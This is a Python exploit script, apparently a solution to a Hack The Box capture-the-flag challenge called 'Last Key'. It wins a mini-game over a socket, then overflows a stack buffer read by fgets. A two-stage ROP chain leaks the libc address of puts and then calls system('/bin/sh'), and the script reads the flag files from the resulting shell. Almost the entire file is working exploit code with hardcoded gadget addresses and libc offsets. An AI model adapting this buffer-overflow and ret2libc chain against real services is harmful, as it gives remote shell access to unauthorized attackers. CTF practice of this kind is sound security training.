#!/usr/bin/env python3
"""Last Key — beat the mini-game, then BOF in set_score's fgets."""
import socket, struct, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])

POP_RDI    = 0x40178d
RET        = 0x40178e
PUTS_PLT   = 0x401100
PUTS_GOT   = 0x403f88
SET_SCORE  = 0x401687
MAIN       = 0x401794

LIBC_PUTS_OFF   = 0x80ed0
LIBC_SYSTEM_OFF = 0x50d60
LIBC_BINSH_OFF  = 0x1d8698

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

def recv_with_timeout(s, secs=1.5):
    s.settimeout(secs)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    return out

def recvuntil(s, marker, timeout=10):
    s.settimeout(timeout)
    buf = b""
    while marker not in buf:
        c = s.recv(1)
        if not c: break
        buf += c
    return buf

s = socket.create_connection((HOST, PORT))

# Beat the mini-game: send 'R' one at a time, check for "You won"
banner = recv_with_timeout(s, 1.0)

won = False
for round_i in range(18):
    s.sendall(b"R")
    out = recv_with_timeout(s, 0.6)
    sys.stdout.write(f"[round {round_i+1}] got {len(out)} bytes after R\n")
    if b"You won" in out or b"Enter your name" in out:
        won = True
        print(f"[+] won the mini-game after {round_i+1} 'R' moves")
        break

if not won:
    print("[!] didn't reach win state — last response:")
    print(out.decode(errors='replace'))
    sys.exit(1)

# Now we're past alter_map. set_score has been called and printed:
#   "Enter your name in the Hall of Fame: "
# then getchar() then fgets(buf, 0x80). The getchar already consumed a byte
# from our move stream OR is waiting; we may need to consume the prompt.
# Drain everything until the fgets is ready.
drained = recv_with_timeout(s, 1.0)

# set_score does getchar() right before fgets — it consumes 1 byte.
# We need to send: <1 byte for getchar> + <BOF payload as fgets input> + \n
# Stage 1: leak libc puts via puts(puts@got), then return to set_score.
PAD = b"A" * (16 + 8)   # 16 buf + 8 saved rbp
stage1 = b"".join([
    PAD,
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(SET_SCORE),
])

# getchar consumes one byte, fgets reads the rest until newline.
# Send: "X" (for getchar) + stage1 + "\n"
s.sendall(b"X" + stage1 + b"\n")

# After fgets returns, set_score does fwrite("Congratulations..."), then
# ret -> POP_RDI -> PUTS_GOT -> PUTS_PLT -> leak libc, then -> SET_SCORE.
# set_score re-runs from the top: cls (escape codes), print banner, etc.
# The puts leak appears between the congratulations message and the next cls.

# Drain until the leak appears. The leak is the 6-byte libc puts address
# (printed by puts, terminated by puts' \n).
# Easiest: read all output for a short time, then parse out the 6-byte leak.
time.sleep(0.5)
post1 = recv_with_timeout(s, 2.0)
print(f"[DEBUG] post-stage1 ({len(post1)} bytes)")

# The leak appears right after "not enough to get the prize..\n\n" + cls escape.
# But simpler: find the cls escape and grab 6 bytes before it.
# cls() does: printf("\x1b[H\x1b[J") = clear screen
# So the leak is the 6 bytes right BEFORE the first \x1b[H sequence that
# follows the "Congratulations" output.

m = re.search(rb"not enough to get the prize\.\.\n\n([\s\S]{1,8}?)\n", post1)
if m:
    leak_bytes = m.group(1)
    print(f"[+] leak bytes: {leak_bytes.hex()} ({leak_bytes!r})")
    libc_puts = int.from_bytes(leak_bytes.ljust(8, b"\x00"), "little")
    print(f"[+] libc puts = {hex(libc_puts)}")
    libc_base = libc_puts - LIBC_PUTS_OFF
    print(f"[+] libc base = {hex(libc_base)}")
    system_addr = libc_base + LIBC_SYSTEM_OFF
    binsh_addr  = libc_base + LIBC_BINSH_OFF
    print(f"[+] system    = {hex(system_addr)}")
    print(f"[+] /bin/sh   = {hex(binsh_addr)}")
else:
    print(f"[!] couldn't find leak in: {post1[:500]!r}")
    sys.exit(1)

# Stage 2: ret2system("/bin/sh"). set_score is at the fgets prompt again.
# (getchar already consumed something from our prior stage1 noise.)
# Actually after set_score re-entry: cls -> fprintf banner -> fwrite prompt
# -> getchar -> fgets. So same setup: send 1 byte for getchar + payload + \n.
stage2 = b"".join([
    PAD,
    p64(RET),
    p64(POP_RDI),
    p64(binsh_addr),
    p64(system_addr),
])

s.sendall(b"X" + stage2 + b"\n")
time.sleep(0.5)
s.sendall(b"cat flag.txt; cat /flag.txt; ls\n")
time.sleep(0.5)
out = recv_with_timeout(s, 3.0)
print("\n[+] shell output:")
print(out.decode(errors='replace'))

m = re.search(rb"HTB\{[^}]+\}", out)
if m:
    print(f"\n[+] FLAG: {m.group(0).decode()}")
s.close()
